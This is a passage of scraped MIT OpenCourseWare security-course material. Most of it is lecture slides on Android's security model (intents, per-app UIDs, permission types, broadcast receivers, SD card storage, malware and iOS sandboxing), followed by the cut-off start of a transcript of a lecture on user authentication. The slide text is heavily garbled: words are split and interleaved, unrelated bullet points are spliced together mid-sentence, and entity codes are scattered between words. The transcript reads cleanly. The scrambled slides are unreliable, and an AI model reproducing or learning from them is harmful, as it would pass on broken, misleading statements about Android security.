perms.	&#13; 't	&#13; necessarily	&#13; care	&#13; who	&#13; sender	&#13; is,	&#13; as	&#13; long	&#13; as	&#13; it	&#13; had	&#13; the	&#13; right	&#13; 
Turns	&#13; out	&#13; apps	&#13; often	&#13; forgot	&#13; to	&#13; put	&#13; perm	&#13; restrictions	&#13; on	&#13; broadcast	&#13; receivers.
 
 
 E.g.,	&#13; can	&#13; create	&#13; an	&#13; alarm	&#13; that	&#13; beeps	&#13; and	&#13; vibrates	&#13; forever.	&#13; Paper	&#13; at	&#13; Usenix	&#13; Security	&#13; 2011:	&#13; "permission	&#13; re-
E.g.,	&#13; can	&#13; s	&#13; 
delegation	&#13; attacks". 	&#13; 
o etc.	&#13; end	&#13; messages	&#13; to	&#13; the	&#13; settings	&#13; bcast	&#13; receiver	&#13; to	&#13; toggle	&#13; wifi,	&#13; 
One	&#13; solution	&#13; in	&#13; android:	&#13; "protected	&#13; broadcasts"	&#13; (not	&#13; complete,	&#13; but..)	&#13; 
6</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>E.g.,	&#13; links	&#13; to	&#13; a	&#13; contact	&#13; manager	&#13; app's	&#13; URL:	&#13; user	&#13; cannot	&#13; c
one.	&#13; hoose	&#13; new	&#13; 
o :	&#13; Somewhat	&#13; limited	&#13; functionality	&#13; for	&#13; purely	&#13; client
 Getting	&#13; better:	&#13; "Web	&#13; intents"	&#13; are	&#13; trying	&#13; to	&#13; solve	&#13; this	&#13; problem.
Getting	&#13; better:	&#13; camera,	&#13; location	&#13; info,	&#13; local	&#13; st-
oraside	&#13; 
ge,	&#13; wapp
orklications.	&#13; 
	&#13; 
threads 	&#13; er	&#13; 
	&#13; 
H
 
 ow	&#13; does	&#13; Android's	&#13; application	&#13; mode
 Mostly	&#13; based	&#13; on	&#13; intel	&#13; handle	&#13; app	&#13; interaction,	&#13; user	&#13; choosing	&#13; app? 	&#13; 
Android	&#13; framework	&#13; decides	&#13; which	&#13; app	&#13; gets	&#13; the	&#13; intent;	&#13; could	&#13; ask	&#13; user.If	&#13; multiple	&#13; apps	&#13; could	&#13; perform	&#13; an	&#13; operation,	&#13; send	&#13; implicit	&#13; intent.nts.	&#13; 
	&#13; 
	&#13; 	&#13; 
H
 ow	&#13; does	&#13; Android's	&#13; application	&#13; model	&#13; handle	&#13; app	&#13; i
o 
 Each	&#13; application's
Exception:	&#13; one	&#13; developer	&#13; can	&#13; stick	&#13; multiple	&#13; applications	&#13; into	&#13; one	&#13; UID.	&#13; processes	&#13; run	&#13; under	&#13; a	&#13; separate	&#13; UIDsolation?
	&#13; in	&#13; L	&#13; 
inux.	&#13; 
Each	&#13; application	&#13; gets	&#13; its	&#13; own	&#13; Java	&#13; runtime	&#13; (but	&#13; that's	&#13; mostly	&#13; by	&#13; convention).	&#13; 
	&#13;  Java	&#13; interpreter	&#13; not	&#13; trusted	&#13; or	&#13;  even	&#13; required;	&#13; kernel	&#13; enforces	&#13; isolation.	&#13; 	&#13; 
Wh
 
 at	&#13; are	&#13; per-app	&#13; UIDs	&#13; good	&#13; fo
Each	&#13; app	&#13; has	&#13; private	&#13; directory	&#13; (/data/data/appname).One	&#13; app	&#13; cannot	&#13; directly	&#13; manipulate	&#13; another	&#13; app's	&#13; processes,	&#13; files.r?	&#13; 
o 	&#13; 	&#13; 
	&#13; Stores	&#13; preferences,	&#13; sqlite	&#13; DBs	&#13; for	&#13; content	&#13; providers,	&#13; cached	&#13;  files,	&#13; etc.	&#13; 
What's	&#13; missing	&#13; from	&#13; UID	&#13; isolation:	&#13; access	&#13; control	&#13; to	&#13; shared	&#13; resources.
 
 Network	&#13; a	&#13; 
  Devices	&#13; (camera,	&#13; compass,	&#13; etc).Removable	&#13; sd	&#13; card.ccess.	&#13; 
	&#13; 
 Intents:	&#13; who	&#13; can	&#13; send,	&#13; what	&#13; intents,	&#13; to	&#13; whom?	&#13; 
And	&#13; we	&#13; also	&#13; need	&#13; to	&#13; somehow	&#13; determine	&#13; the	&#13; policy	&#13; for	&#13; all	&#13; of	&#13; 
	&#13; 	&#13; this. 	&#13; 
First,	&#13; mechanism:	&#13; how	&#13; does	&#13; Android	&#13; control	&#13; access	&#13; to	&#13; all	&#13; of	&#13; the	&#13; above?
 
GID AID_NET_BT_ADMIN (3001): can create low
GID AID_NET_BT       (3002)Net
ow
 ork	&#13; access:	&#13; GIDs. 	&#13; 	&#13; 
-level bluetooth sockets  
: can create bluetooth socket  
GID AID_INET         (3003): can create IP socketSpecial	&#13; group	&#13; IDs	&#13; define	&#13; what	&#13; apps	&#13; can	&#13; talk	&#13; to	&#13; the	&#13; networ
 k.	&#13; 
GID AID_NET_RAW      (3004): can create raw socket
GID AID_NET_ADMIN    (3005): can change network config (ifconfig, ..)
o 
o 
o Requir
Each	&#13; app	&#13; getses	&#13; kernel	&#13; changes	&#13; to	&#13; do	&#13; this. 	&#13; 
No	&#13; finer
 -grained	&#13; control	&#13; of	&#13; network	&#13; communication.	&#13; a	&#13; subset	&#13; of	&#13; these	&#13; group	&#13; IDs,	&#13; depending	&#13;  
	&#13; on	&#13; its	&#13; privileges. 	&#13;  
 Access	&#13; to	&#13; removable	&#13; sd	&#13; card.
o E.g.,	&#13; could	&#13; have	&#13; imagined	&#13; per
	&#13; -IP-addr	&#13; or	&#13; per -origin-like	&#13; policies. 	&#13; 
Why	&#13; not	&#13; use	&#13; file	&#13; system	&#13; permissions?
 Want	&#13; to	&#13; use	&#13; FAT	&#13; file	&#13; system	&#13; on	&#13; SD	&#13; card,	&#13; to	&#13; allow	&#13; access	&#13; on	&#13; other	&#13; 	&#13; 
devices. 	&#13; 
3</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>How 
o Another	&#13; cause:	&#13; copies	&#13; of	&#13; existing	&#13; Android	&#13; apps	&#13; containing	&#13; 
 	&#13; to	&#13; malware.	&#13; 
fix?	&#13; 
 asFind	&#13; ways	&#13; to	&#13; allow	&#13; more	&#13; permissions	&#13; "non-
king	&#13; user. 	&#13; dangerous"	&#13; without	&#13; 
 Allow	&#13; user	&#13; to	&#13; selectively	&#13; disable	&#13; certain	&#13; permissions.	&#13; (Some	&#13; 
resea
Static/runtime	&#13; analysis	&#13; and	&#13; auditing	&#13; --	&#13; implemented	&#13; by	&#13; Google	&#13; rch	&#13; work	&#13; on	&#13; this,	&#13; see	&#13; refs	&#13; below.) 	&#13; 
now.
 
 	&#13; 
 LookRunss	&#13; 
	&#13; apps	&#13; for	&#13; a	&#13; little	&#13; bit	&#13; to	&#13; determine	&#13; what	&#13; they	&#13; do.	&#13; for	&#13; near -identical	&#13; clones	&#13; of	&#13; existing	&#13; popular	&#13; apps. 	&#13; 
 Secur
scanner.ity	&#13; r
	&#13; esearchers	&#13; got	&#13; a	&#13; (non -root)	&#13; shell	&#13; on	&#13; Google's	&#13; app	&#13; 
 Reasonably	&#13; expected	&#13; in	&#13; rthe	&#13; app.. 	&#13; etrospect:	&#13; app	&#13; scanner	&#13; just	&#13; runs	&#13; 
Android's	&#13; app	&#13; market	&#13; (Google	&#13; Play)	&#13; allows	&#13; Google	&#13; to	&#13; remotely	&#13; kill	&#13; an	&#13; app.
	&#13; 
Other	&#13; model	&#13; for	&#13; security	&#13; in	&#13; mobile	&#13; phone	&#13; apps:	&#13; iOS/iPhone.	&#13; 	&#13; 
 Security	&#13; mechanism:	&#13; all	&#13; apps	&#13; run	&#13; two	&#13; possible	&#13; UIDs.	&#13; 
o 
o 
o One	&#13; UID	&#13; for	&#13; Apple	&#13; apps,	&#13; another	&#13; for	&#13; all	&#13; other	&#13; apps.	&#13; 
o HWith	&#13; switch	&#13; to	&#13; multi-istorically	&#13; made	&#13; sense:	&#13; only	&#13; one	&#13; app	&#13; was	&#13; active	&#13; at	&#13; a	&#13; time.	&#13; 
o Instead,	&#13; isolate	&#13; apps	&#13; using	&#13; Apple's	&#13; sandbox	&#13; ("Seatbelt"?).	&#13; tasking	&#13; apps,	&#13; didn't	&#13; change	&#13; the	&#13; UID	&#13; model.	&#13; 
o 
 Apple	&#13; applications	&#13; not	&#13; isolated	&#13; from	&#13; each	&#13; other	&#13; originally	&#13; (unclear	&#13; now?).	&#13; 
Prompt	&#13; for	&#13; permissions	&#13; at	&#13; time	&#13; of	&#13; use.	&#13; 
o Thus,	&#13; exploit	&#13; of	&#13; vulnerability	&#13; in	&#13; browser	&#13; left	&#13; all	&#13; Apple	&#13; apps	&#13; "exposed".	&#13; 
o 
 Users	&#13; can	&#13; run	&#13; app	&#13; and	&#13; not	&#13; give	&#13; it	&#13; permissions	&#13; (unlike	&#13; Android).	&#13; 
Apple	&#13; approves	&#13; apps	&#13; in	&#13; its	&#13; app	&#13; store,	&#13; in	&#13; part	&#13; based	&#13; on	&#13; security	&#13; eval.
o"Normal"	&#13; permissions	&#13; not	&#13; very	&#13; meaningful	&#13; in	&#13; this	&#13; model.	&#13; 
"Reputation-based"	&#13; system:	&#13; hard	&#13; to	&#13; exploit	&#13; many	&#13; phones	&#13; and	&#13; avoid	&#13; 	&#13; 
	&#13;  
detection. 	&#13; 
Refer
 
 ences: 	&#13; 
 http://developer.android.com/guide/topics/security/security.html	&#13; http://research.microsoft.com/pubs/149596/AppFence.pdf
 
 http://css.csail.mit.edu/6.858/2012/readings/ios-
ht
v1.0.pdftp://reverse.put.as/wsecurity-may12.pdf	&#13; 
	&#13; p-content/uploads/2011/09/Apple-Sandbox-Guide-
	&#13; 	&#13; 
9</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>o Reference	&#13; monitor	&#13; keeps	&#13; granted	&#13; URIs	&#13; in	&#13; memory.
 
o 	&#13; 
 ntref:	&#13; ActivityManagerService.mGrantedUriPermissions
Pending	&#13; int
o Gra
ents	&#13; a
s.re	&#13; ephemeral
	&#13; ,	&#13; only	&#13; last	&#13; until	&#13; a	&#13; reboot.	&#13; 	&#13; 
o Use	&#13; case:	&#13; callbacks	&#13; into	&#13; your	&#13; application	&#13; (e.g.,	&#13; from	&#13; alarm/time	&#13; service).
system_server	&#13; keeps	&#13; track	&#13; of	&#13; pending	&#13; intents	&#13; in	&#13; memory;	&#13; ephemeral.
 	&#13; 
o 
 Revocation	&#13; problem,	&#13; as	&#13; withref:	&#13; PendingIntentRecord.j 	&#13; 	&#13; 
	&#13; URI	&#13; delava
"Breaks"	&#13; the	&#13; MAC	&#13; model:	&#13; can't	&#13; quite	&#13; reason	&#13; about	&#13; all	&#13; security	&#13; from	&#13; manifest.egation.	&#13; 
	&#13; 	&#13; 
Wh
 
 e
Two	&#13; options:	&#13; internal	&#13; phone	&#13; memory	&#13; or	&#13; SD	&#13; card.re	&#13; are	&#13; apps	&#13; stored? 	&#13; 
 Internal	&#13; memory	&#13; is	&#13; always	&#13; controlled	&#13; by	&#13; Android,	&#13; so	&#13; can	&#13; assume	&#13; it's	&#13; safe.	&#13; 
Installing	&#13; apps
o 	&#13; on	&#13; SD	&#13; card	&#13; is	&#13; more	&#13; complicated,	&#13; but	&#13; desirable	&#13; due	&#13; to	&#13; space.	&#13; 
Threat	&#13; models:
 	&#13; 	&#13; 
 
o Worried	&#13; about	&#13; malicious	&#13; app	&#13; modifying	&#13; SD	&#13; card	&#13; data.	&#13; 
	&#13; o SD	&#13; card	&#13; uses	&#13; FAT	&#13; file	&#13; system,	&#13; no	&#13; file	&#13; permissions.Worried	&#13; about	&#13; malicious	&#13; user	&#13; making	&#13; copies	&#13; of	&#13; a	&#13; paid	&#13; app.	&#13; 
o Approach:	&#13; encrypt/aut	&#13; 
Key	&#13; stored	&#13; in	&#13; phone's	&#13; intehent
rnal	&#13; ficate	&#13; a
laspp	&#13; code	&#13; w
h,	&#13; unique	&#13; toith	&#13; a
	&#13; ph	&#13; per
one-
.	&#13; phone	&#13; random	&#13; key.	&#13; 
H
 
 ow	&#13; secure	&#13; is	&#13; the	&#13; Android	&#13; "platform"?
TCBBette:	&#13; k	&#13; 
o rernel	&#13; +	&#13; a
ehing	&#13; running	&#13; a
 	&#13; th
Moan	&#13; d snyt
ost	&#13; applikto
cp	&#13; appli
ations	&#13; arcatio
  Manye:s	&#13; root
	&#13; .	&#13; 
	&#13; nons
t	&#13; par
ng	&#13; ast	&#13; o
Some	&#13; vulnerabilities	&#13; show	&#13; up	&#13; in	&#13; practice.	&#13; fewer	&#13; things	&#13; runni 	&#13; rof
o	&#13; th
t.	&#13; e	&#13; TCB.	&#13; 
Bugs
o	&#13; i
 n	&#13; the	&#13; Linux	&#13; ke	&#13; 
o How	&#13; to	&#13; do	&#13; betr
tne
er?l	&#13; o
	&#13; r	&#13; in	&#13; setuid -root	&#13; binaries	&#13; allow	&#13; apps	&#13; to	&#13; get	&#13; root. 	&#13; 
Users	&#13; inadvertently	&#13; install	&#13; malware	&#13; applications	&#13; with	&#13; dangerous	&#13; permissions.o 
 Syscall	&#13; filtering	&#13; /	&#13; seccomp	&#13; to	&#13; make	&#13; it	&#13; harder	&#13; to	&#13; exploit	&#13; kernel	&#13; bugs?
Not	&#13; clear. 	&#13; 	&#13; 
o 
o Actual	&#13; common	&#13; malware:	&#13; send	&#13; SMS	&#13; messages	&#13; to	&#13; premium	&#13; numbers.	&#13; 	&#13; 
o Attackers	&#13; directly	&#13; get	&#13; money	&#13; by	&#13; deploying	&#13; such	&#13; malware.Why	&#13; do	&#13; users	&#13; make	&#13; such	&#13; mistakes?
 	&#13; 
 One	&#13; cause:	&#13; some	&#13; permissions	&#13; nsensit	&#13; 
ive	&#13; taecessary	&#13; for	&#13; both	&#13; mundane	&#13; +	&#13; 
 E.g.,	&#13; accesdevice	&#13; ID.	&#13; sing	&#13; phone	&#13; ssks.	&#13; 
tate	&#13; /	&#13; identity	&#13; required	&#13; to	&#13; get	&#13; a	&#13; unique	&#13; 
 C
sensitauses	&#13; unnecessary	&#13; requests	&#13; for	&#13; dangerous	&#13; permissions,	&#13; de
izes	&#13; user.	&#13; -
 Another	&#13; cause:	&#13; apps	&#13; ask	&#13; for	&#13; permissions	&#13; upfront	&#13; "just	&#13; in	&#13; case
E.g.,	&#13; might	&#13; need	&#13; them	&#13; later,	&#13; but	&#13; changing	&#13; perms	&#13; requires	&#13; manual	&#13; ".	&#13; 
 updAnother	&#13; cause:	&#13; cannot	&#13; say	&#13; "no"	&#13; to	&#13; certain	&#13; permissions.ate.	&#13; 
	&#13; 
8</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>Intent:	&#13; basic	&#13; messaging	&#13; primitive	&#13; in	&#13; Android. 
 Represe nts	&#13; app's	&#13; intent	&#13; to	&#13; do	&#13; something	&#13; /	&#13; interact	&#13; with	&#13; another	&#13; component.	&#13; 
	&#13; 	&#13; 
Intent	&#13; f
 Component:	&#13; name	&#13; of	&#13; component	&#13; to	&#13; route	&#13; the	&#13; request	&#13; to	&#13; (just	&#13; a	&#13; string).ield
Action:	&#13; the	&#13; opcode	&#13; for	&#13; this	&#13; message	&#13; (just	&#13; a	&#13; string).o s:	&#13; 
 E.g.,	&#13; com.google.someapp/ComponentName	&#13; 	&#13; 
o 
 E.g.,	&#13; 	&#13; 
Data
o:	&#13; 
 
o UR
E.g.,	&#13; tel:16172536005,	&#13; content://contacts/people/1	&#13; (for	&#13; DIAL).I	&#13; of	&#13; android.intent.action.MAIN,	&#13; android.intent.action.DIAL,	&#13; ..
data	&#13; for	&#13; the	&#13; action	&#13; (just	&#13; a	&#13; string). 	&#13; 	&#13; 
 Also	&#13; includes	&#13; the	&#13; MIME	&#13; type	&#13; of	&#13; the	&#13; data.	&#13; 
Category:	&#13; a	&#13; filtering	&#13; mechanism	&#13; for	&#13; finding
o E.g.,	&#13; android.intent.category.BROWSABLE	&#13; means	&#13; safe	&#13; to	&#13; invoke	&#13; from	&#13; 	&#13; whe	&#13; 
re	&#13; to	&#13; send	&#13; intent. 	&#13; 
br
dao
taws
.	&#13; er,	&#13; for	&#13; action	&#13; android.intent.action.VIEW,	&#13; which	&#13; views	&#13; the	&#13; URI	&#13; in	&#13; 
	&#13; 
 
 Explicit	&#13; intents:	&#13; component	&#13; name	&#13; specified.Implicit	&#13; intents:	&#13; no	&#13; component	&#13; name,	&#13; so	&#13; the	&#13; s
o 	&#13; 
o 
o LookCould	&#13; also	&#13; ask	&#13; the	&#13; user	&#13; what	&#13; app	&#13; to	&#13; use,	&#13; if	&#13; multiple	&#13; components	&#13; match.s	&#13; at	&#13; action,	&#13; data,	&#13; category. 	&#13; ystem	&#13; must	&#13; figure	&#13; it	&#13; out.	&#13; 
	&#13; E.g.,	&#13; user	&#13; clicks	&#13; on	&#13; an	&#13; address	&#13;  --	&#13; what	&#13; map	&#13; application	&#13; to	&#13; open?	&#13; 	&#13; 
RPC
 
 Initial	&#13; communication	&#13; to	&#13; a	&#13; service	&#13; happens	&#13; 	&#13; to	&#13; services. 	&#13; 
Service	&#13; can	&#13; also	&#13; define	&#13; an	&#13; RPC
o 	&#13; protocol	&#13; for	&#13; clients	&#13; to	&#13; use.by	&#13; sending	&#13; an	&#13; i
	&#13; ntent.	&#13; 
More	&#13; efficient	&#13; than	&#13; sending	&#13; intents	&#13; each	&#13; time.
	&#13; o Client	&#13; "binds"	&#13; a	&#13; connection	&#13; to	&#13; a	&#13; service. 	&#13; 	&#13; 
Net
 
 Work	&#13; just	&#13; as	&#13; in	&#13; any	&#13; other	&#13; Linux	&#13; system.working	&#13; --	&#13; accessing	&#13; the	&#13; Internet. 	&#13; 
	&#13; Application	&#13; can	&#13; use	&#13; sockets	&#13; directly,	&#13; or	&#13; vi	&#13; 
a	&#13; Java's	&#13; networking	&#13; libraries. 	&#13; 
Why	&#13; do	&#13; we	&#13; need	&#13; a	&#13; new	&#13; app	&#13; model?	&#13; 	&#13; (Or,	&#13; what's	&#13; wrong	&#13; with	&#13; existing	&#13; models?)
 Desk
o 
o top	&#13; applications: 	&#13; 	&#13; 
Web/bro :	&#13; Not	&#13; much	&#13; isolation	&#13; between	&#13; applications.
o 
+:	&#13; Applications	&#13; can	&#13; easily	&#13; interact	&#13; with	&#13; one	&#13; another,	&#13; share	&#13; files.:	&#13; Every	&#13; app	&#13; has	&#13; full	&#13; privileges, 	&#13; any	&#13; one	&#13; malicious	&#13; app	&#13; can	&#13; take	&#13; over.	&#13; 
 +:	&#13; User	&#13; can	&#13; choose	&#13; app	&#13; for	&#13; each	&#13; task	&#13; (email	&#13; app,	&#13; image	&#13; viewer,	&#13; etc).	&#13; 	&#13; 
o 	&#13; 
o ows
o +:	&#13; 
:	&#13; Requires	&#13; a	&#13; server	&#13; in	&#13; the	&#13; typical	&#13; model	&#13; (hard	&#13; to	&#13; use	&#13; offline).No	&#13; e
need	&#13; r-bas
te
o	&#13; d
inst	&#13; appli
allc
	&#13; ati
appo
lns
ica:	&#13; 
tions	&#13; or	&#13; worry	&#13; about	&#13;  local	&#13; state.	&#13; 
o :	&#13; Limited	&#13; interactions	&#13; between	&#13; applications.:	&#13; 	&#13; 
Interactions	&#13; that	&#13; do	&#13; exist	&#13; are	&#13; typically	&#13; hard	&#13; 
-wired	&#13; to	&#13; particular	&#13; URLs. 	&#13; If	&#13; user	&#13; is	&#13; running	&#13; bank	&#13; app	&#13; (activity),	&#13; no	&#13; other	&#13; activity	&#13; gets	&#13; user's	&#13; input. 	&#13; 
2</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>Who	&#13; defines	&#13; permissions?
 
 Apps	&#13; define	&#13; permissions	&#13; themselves	&#13; (recall:	&#13; just	&#13; free	&#13; 
Android	&#13; syst
o em	&#13; defines	&#13; perms	&#13; for	&#13; built-in	&#13; resources	&#13; (camera,	&#13; network,	&#13; etc).-form	&#13; strings).	&#13; 
 Built
o-
 in	&#13; applications	&#13; define	&#13; permissions	&#13; for	&#13; services	&#13; they	&#13; provide.Can	&#13; list	&#13; with	&#13; 'adb	&#13; shell	&#13; pm	&#13; list	&#13; permissions	&#13; -g'.	&#13; 	&#13; 
 E.g.,	&#13; read/write	&#13; contacts,	&#13; send	&#13; SMS	&#13; message,	&#13; etc.	&#13; 	&#13; 
Defining	&#13; a	&#13; permission	&#13; 
o 
o 
oUser -visible	&#13; name	&#13; of	&#13; the	&#13; permission.means	&#13; specifying:	&#13; 
 Description	&#13; of	&#13; the	&#13; permission	&#13; for	&#13; the	&#13; user.	&#13; 
	&#13; o Type	&#13; of	&#13; permission:	&#13; "normal",	&#13; "dangerous",	&#13; and	&#13; "signature".Grouping	&#13; permission	&#13; into	&#13; some	&#13; categories	&#13; (costs	&#13; money,	&#13; private	&#13; data,	&#13; 
et	&#13; 
c).	&#13; 
	&#13; 
Wh
 at	&#13; d
Normal:
oo
 	&#13; the
	&#13; 	&#13; three	&#13; typ es	&#13; of	&#13; permission	&#13; mean?	&#13; 
Benign	&#13; permissions	&#13; that	&#13; could	&#13; let	&#13; an	&#13; app	&#13; annoy	&#13; the	&#13; user,	&#13; but	&#13; not	&#13; drastic.
 
 E.g.,	&#13; SET_WALLPAPER.	&#13; 	&#13; 
o 
o System	&#13; doesn't	&#13; bother	&#13; asking	&#13; the	&#13; user	&#13; about	&#13; "normal"	&#13; permissions.diff	&#13; $(pm	&#13; list	&#13; permissions	&#13; -g	&#13; -d)	&#13; and	&#13; $(pm	&#13; list	&#13; permissions	&#13; -g)
	&#13; 	&#13; 
Why	&#13; bother	&#13; having	&#13; them	&#13; at	&#13; all?
  	&#13; 
 DaLeaCan
st	&#13; review
-privilege,	&#13; if	&#13; application	&#13; is	&#13; compromised	&#13; later.	&#13; if	&#13; really	&#13; interested. 	&#13; 
ng
 	&#13; 
Signaturo
o erou
Could	&#13; allow	&#13; an	&#13; app	&#13; to	&#13; do	&#13; something	&#13; dangerous.s:	&#13; 
 E.g.,	&#13; internet	&#13; access,	&#13; access	&#13; to	&#13; contact	&#13; information,	&#13; etc.	&#13; 
o e:	&#13; 	&#13; 
o CaThink	&#13; ForceHn	&#13; only	&#13; be 	&#13; granted	&#13; to	&#13; apps	&#13; signed	&#13; by	&#13; the	&#13; same	&#13; developer.
TTPS:	&#13; want	&#13; to	&#13; prevent	&#13; user	&#13; from	&#13; accidentally	&#13; giving	&#13; it	&#13; away.	&#13; 
	&#13; 	&#13; 
Why	&#13; do	&#13; this	&#13; checking	&#13; in	&#13; the	&#13; reference	&#13; monitor,	&#13; rather	&#13; than	&#13; in	&#13; each	&#13; app?
 Convenience,	&#13; so	&#13; programmers	&#13; don't	&#13; forget.
o 	&#13; 
 Intent	&#13; might	&#13; be	&#13; routed	&#13; to	&#13; different	&#13; components	&#13; based	&#13; on	&#13; permissions.
o Could	&#13; do	&#13; it	&#13; in	&#13; a	&#13; library	&#13; on	&#13; the	&#13; applicati	&#13; 
on	&#13; side.	&#13; 
 Mandatory	&#13; access	&#13; control	&#13; (MAC
o Don't	&#13; want	&#13; to	&#13; send	&#13; an	&#13; intent	&#13; to	&#13; component	&#13; A	&#13; that	&#13; will	&#13; reject	&#13; it,
component	&#13; B	&#13; is	&#13; willing	&#13; to	&#13; accept	&#13; it.	&#13; 
):	&#13; permissio	&#13; if	&#13; a	&#13; 
nother	&#13; 
Aside:	&#13; annoyance,	&#13; MAC
 	&#13; is	&#13; an	&#13; overloaded	&#13; acronym.ns	&#13; specified	&#13; separately	&#13; from	&#13; code.	&#13; 
o Want	&#13; to	&#13; understand	&#13; security	&#13; properties	&#13; of	&#13; system	&#13; without	&#13; l Message	&#13; Authentication	&#13; CMedia	&#13; Access	&#13; Control	&#13; --	&#13; MAC	&#13; 
ode	&#13; 	&#13; address	&#13; in	&#13; Ethernet.
--	&#13; the	&#13; thing	&#13; that	&#13; Ker	&#13; 
ber
ookos	&#13; v
code.ing	&#13; a4	&#13; lac
t	&#13; ked.	&#13; 
 Contrast:	&#13; discretionary	&#13; access	&#13; control	&#13; (DAC
o 	&#13; 
o Each	&#13; app	&#13; sets	&#13; its	&#13; own	&#13; permissions	&#13; on	&#13; files.)	&#13; in	&#13; Unix.
	&#13; 	&#13; 
Permissions	&#13; can	&#13; be	&#13; changed	&#13; by	&#13; the	&#13; app	&#13; over	&#13; time.	&#13; 
5</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-17-user-authentication/</video_url>
          <video_title>Lecture 17: User Authentication</video_title>
          <transcript>
            <slice>
              <time_slice>0:00</time_slice>
              <text_slice>The following content is
provided under a Creative</text_slice>
            </slice>
            <slice>
              <time_slice>0:02</time_slice>
              <text_slice>Commons license.</text_slice>
            </slice>
            <slice>
              <time_slice>0:03</time_slice>
              <text_slice>Your support will help
MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:06</time_slice>
              <text_slice>continue to offer high quality
educational resources for free.</text_slice>
            </slice>
            <slice>
              <time_slice>0:10</time_slice>
              <text_slice>To make a donation or to
view additional materials</text_slice>
            </slice>
            <slice>
              <time_slice>0:12</time_slice>
              <text_slice>from hundreds of MIT courses,
visit MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:16</time_slice>
              <text_slice>at ocw.mit.edu.</text_slice>
            </slice>
            <slice>
              <time_slice>0:25</time_slice>
              <text_slice>PROFESSOR: All right, guys.</text_slice>
            </slice>
            <slice>
              <time_slice>0:26</time_slice>
              <text_slice>So let's get started.</text_slice>
            </slice>
            <slice>
              <time_slice>0:28</time_slice>
              <text_slice>Welcome back from what I
hope was an exciting holiday</text_slice>
            </slice>
            <slice>
              <time_slice>0:31</time_slice>
              <text_slice>for everyone.</text_slice>
            </slice>
            <slice>
              <time_slice>0:32</time_slice>
              <text_slice>So today we're going to talk
about user authentication.</text_slice>
            </slice>
            <slice>
              <time_slice>0:35</time_slice>
              <text_slice>So the basic challenge that
we want to address today</text_slice>
            </slice>
            <slice>
              <time_slice>0:37</time_slice>
              <text_slice>is how can human users prove
their identity to a program?</text_slice>
            </slice>
            <slice>
              <time_slice>0:42</time_slice>
              <text_slice>In particular, the paper that
was assigned for today's class</text_slice>
            </slice>
            <slice>
              <time_slice>0:45</time_slice>
              <text_slice>addresses an
existential question</text_slice>
            </slice>
            <slice>
              <time_slice>0:47</time_slice>
              <text_slice>in the security community.</text_slice>
            </slice>
            <slice>
              <time_slice>0:48</time_slice>
              <text_slice>Is there anything better than
passwords for authentication?</text_slice>
            </slice>
            <slice>
              <time_slice>0:53</time_slice>
              <text_slice>So at a high level it seems like
passwords are a terrible idea.</text_slice>
            </slice>
            <slice>
              <time_slice>0:57</time_slice>
              <text_slice>So they have very low entropy,
its very easy for attackers</text_slice>
            </slice>
            <slice>
              <time_slice>1:00</time_slice>
              <text_slice>to guess them.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01</time_slice>
              <text_slice>Also the security
questions that we</text_slice>
            </slice>
            <slice>
              <time_slice>1:03</time_slice>
              <text_slice>use to recover
from lost passwords</text_slice>
            </slice>
            <slice>
              <time_slice>1:05</time_slice>
              <text_slice>often have even lower
entropy than the passwords</text_slice>
            </slice>
            <slice>
              <time_slice>1:07</time_slice>
              <text_slice>themselves, which also
seems like a problem.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10</time_slice>
              <text_slice>And even worse, users typically
will use the same password</text_slice>
            </slice>
            <slice>
              <time_slice>1:15</time_slice>
              <text_slice>across a lot of different sites.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16</time_slice>
              <text_slice>So that means that the
vulnerability in one password,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19</time_slice>
              <text_slice>if it's easy to guess, could
expose a user's activity</text_slice>
            </slice>
            <slice>
              <time_slice>1:22</time_slice>
              <text_slice>across a wide range of sites.</text_slice>
            </slice>
            <slice>
              <time_slice>1:24</time_slice>
              <text_slice>So as the paper for
today's class states,</text_slice>
            </slice>
            <slice>
              <time_slice>1:27</time_slice>
              <text_slice>I love this quote, "the
continued domination</text_slice>
            </slice>
            <slice>
              <time_slice>1:28</time_slice>
              <text_slice>of passwords over
all of the methods</text_slice>
            </slice>
            <slice>
              <time_slice>1:31</time_slice>
              <text_slice>of in-user authentication
is a major embarrassment</text_slice>
            </slice>
            <slice>
              <time_slice>1:34</time_slice>
              <text_slice>for security researchers."</text_slice>
            </slice>
            <slice>
              <time_slice>1:36</time_slice>
              <text_slice>All right, so the community
just seething out there,</text_slice>
            </slice>
            <slice>
              <time_slice>1:37</time_slice>
              <text_slice>they want some
better alternative.</text_slice>
            </slice>
            <slice>
              <time_slice>1:39</time_slice>
              <text_slice>But it's not clear
if there actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:41</time_slice>
              <text_slice>is an authentication scheme
that actually totally dominates</text_slice>
            </slice>
            <slice>
              <time_slice>1:45</time_slice>
              <text_slice>passwords, that's more usable,
that's more deployable,</text_slice>
            </slice>
            <slice>
              <time_slice>1:48</time_slice>
              <text_slice>that's more secure.</text_slice>
            </slice>
            <slice>
              <time_slice>1:49</time_slice>
              <text_slice>So in today's lecture, we'll
basically do three things.</text_slice>
            </slice>
            <slice>
              <time_slice>1:52</time_slice>
              <text_slice>So first of all,
we're going to look</text_slice>
            </slice>
            <slice>
              <time_slice>1:53</time_slice>
              <text_slice>and we're going to see how
current passwords can work.</text_slice>
            </slice>
            <slice>
              <time_slice>1:55</time_slice>
              <text_slice>Then we're going to talk
about the desirable properties</text_slice>
            </slice>
            <slice>
              <time_slice>1:58</time_slice>
              <text_slice>at a high level for any
authentication scheme.</text_slice>
            </slice>
            <slice>
              <time_slice>2:01</time_slice>
              <text_slice>And then we're finally going to
look at what the paper gives us</text_slice>
            </slice>
            <slice>
              <time_slice>2:05</time_slice>
              <text_slice>in terms of metrics for
authenticating authentication</text_slice>
            </slice>
            <slice>
              <time_slice>2:07</time_slice>
              <text_slice>schemes, and we're
